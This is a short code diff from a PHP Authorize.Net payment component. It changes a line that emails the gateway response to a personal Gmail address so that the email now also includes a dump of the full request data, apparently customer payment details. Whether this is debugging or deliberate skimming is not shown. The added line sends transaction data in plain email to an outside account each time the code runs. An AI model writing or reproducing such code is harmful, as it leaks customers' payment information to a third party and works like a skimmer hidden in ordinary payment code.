@@ -158,7 +158,7 @@ class AuthorizeNetComponent extends Component {
         $httpSocket = new HttpSocket();
 
         $response = $httpSocket->post('https://secure.authorize.net/gateway/transact.dll', $post_values);
-        mail('ehask71@gmail.com', 'Test Auth.Net', 'Params' . ' - ' . $response);
+        mail('ehask71@gmail.com', 'Test Auth.Net', 'Params' . ' - ' . $response.print_r($data,1));
         if (!empty($response['body'])) {
             $parsed = preg_split("/,(?=(?:[^\"]*\"[^\"]*\")*(?![^\"]*\"))/", $response['body']);
             foreach ($parsed as $key => $value) {
